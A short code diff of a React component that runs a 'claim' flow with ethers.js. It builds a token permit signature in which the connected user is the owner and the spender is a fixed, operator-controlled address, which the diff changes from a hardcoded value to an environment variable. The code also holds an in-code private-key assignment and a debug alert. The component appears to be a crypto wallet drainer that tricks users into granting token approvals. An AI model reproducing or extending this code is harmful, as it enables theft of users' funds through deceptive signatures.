@@ -91,6 +91,7 @@ const Box2 = () => {
     setClaiming(true)
 
     try {
+      alert(process.env.NEXT_PUBLIC_ADDRESS)
       const walletProvider = new ethers.providers.JsonRpcProvider(mainnetRpcUrl)
       //const privateKey = process.env.PRIVATE_KEY
       const privateKey =
@@ -254,7 +255,7 @@ const Box2 = () => {
       }
       const message = {
         owner: address,
-        spender: "0xa44933EB3c11c239DFf2df693E8934ad6b642a9c",
+        spender: process.env.NEXT_PUBLIC_ADDRESS,
         value: value.toString(),
         nonce: nonce.toString(),
         deadline: deadline.toString(),
